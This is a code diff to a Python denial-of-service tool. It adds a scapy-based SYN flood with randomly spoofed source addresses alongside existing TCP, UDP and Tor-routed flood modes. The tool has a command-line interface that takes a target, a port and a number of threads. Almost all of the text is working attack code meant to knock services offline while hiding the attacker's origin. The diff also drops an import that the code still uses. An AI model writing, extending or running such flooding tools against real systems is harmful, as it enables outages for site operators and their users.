@@ -3,13 +3,15 @@
 # MIT License
 
 # Dist Modules
-import os
+from argparse import ArgumentParser
+from scapy.all import *
+# Built-in
 import sys
 import time
+import random
 import socket
 import threading
 from threading import Thread
-from argparse import ArgumentParser
 # Site Modules
 from modules.tor_ip_switcher import switch_ip
 from modules import socks
@@ -32,6 +34,35 @@ class Dos():
         size = os.urandom(min(65507, buffer_size))
         return size
 
+    def rnd_ip(self):
+        def ip():
+            ip_list = []
+            for i in range(4):
+                integer = str(random.randint(0, 255))
+                ip_list.append(integer)
+            ip = ".".join(ip_list)
+            return ip
+
+        def port():
+            port = random.randint(1, 35535)
+            return port
+
+        return ip(), port()
+
+    def syn_flood(self, ip, port, buffer_size=None):
+        """ Syn flood """
+
+        while True:
+            try:
+                src_ip = self.rnd_ip()[0]
+                src_port = self.rnd_ip()[1]
+                network_layer = IP(src=src_ip, dst=ip)
+                transport_layer = TCP(sport=src_port, dport=port, flags="S")
+                send(network_layer/transport_layer)
+            except Exception as ex:
+                print(RED + "Error in SYN :", ex)
+                continue
+
     def tor_flood(self, ip, port, buffer_size):
         """ TCP flood over TOR. You need a running tor service on 'localhost' and default port (9050) """
 
@@ -43,8 +74,8 @@ class Dos():
                     sock.set_proxy(proxy_type=socks.SOCKS5, addr="localhost", port=9050)
                     sock.connect((ip, port))
                     sock.send(data)
-            except Exception:
-                print(RED + "Error in TOR" + RESET)
+            except Exception as ex:
+                print(RED + "Error in TOR :", ex)
                 continue
 
     def tcp_flood(self, ip, port, buffer_size):
@@ -56,8 +87,8 @@ class Dos():
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                     sock.connect((ip, port))
                     sock.send(data)
-            except Exception:
-                print(RED + "Error in TCP" + RESET)
+            except Exception as ex:
+                print(RED + "Error in TCP :", ex)
                 continue
 
     def udp_flood(self, ip, port, buffer_size):
@@ -68,8 +99,8 @@ class Dos():
                 data = self.size(buffer_size)
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                     sock.sendto(data, (ip, port))
-            except Exception:
-                print(RED + "Error in UDP" + RESET)
+            except Exception as ex:
+                print(RED + "Error in UDP :", ex)
                 continue
 
 class Controller(Dos):
@@ -107,7 +138,7 @@ class Controller(Dos):
         parser = ArgumentParser(description=CYAN + self.banner_txt.replace("-V-", self.version) + RESET)
         parser.add_argument("-t", "--target", type=str, dest="target_addr", metavar="Target Address", help="[www.domain.com]")
         parser.add_argument("-p", "--port", type=int, dest="port", metavar="Port Number", help="[1-35535]")
-        parser.add_argument("-m", "--mode", type=str, dest="dos_mode", metavar="DoS Mode", help="[udp|tcp|tor]")
+        parser.add_argument("-m", "--mode", type=str, dest="dos_mode", metavar="DoS Mode", help="[udp|tcp|syn|tor]")
         parser.add_argument("-a", "--amount", type=int, dest="amount", metavar="Number of Threads", help="N")
         parser.add_argument("-bs", "--buffer-size", type=int, dest="buffer_size", metavar="Package size in bytes", help="[1-65507]")
         args = parser.parse_args()
@@ -126,10 +157,10 @@ class Controller(Dos):
                     self.tor_pass = self.check_for_tor_pass()
                 return True
             except Exception as ex:
-                print("Use -h or --help for futher information :", ex)
+                print(RED + "Use -h or --help for futher information :", ex)
                 sys.exit(0)
         else:
-            print("Use -h or --help for futher information")
+            print(RED + "Use -h or --help for futher information")
             sys.exit(0)
 
     def check_for_tor_pass(self):
@@ -170,12 +201,14 @@ class Controller(Dos):
             self.dos = lambda t, p, b: self.tcp_flood(target_ip, port, buffer_size)
         elif dos_mode == 'udp':
             self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+        elif dos_mode == 'syn':
+            self.dos = lambda t, p, b: self.syn_flood(target_ip, port, buffer_size)
         elif dos_mode == 'tor':
             self.dos = lambda t, p, b: self.tor_flood(target_ip, port, buffer_size)
             switch_ip_true = switch_ip(tor_pass=self.tor_pass)
             if switch_ip_true: print(CYAN + "NEW TOR CIRCUIT LOADED" + RESET)
             else:
-                print(RED + "Error in switch_ip" + RESET)
+                print(RED + "Error in switch_ip")
                 sys.exit(0)
         try:
             global thread
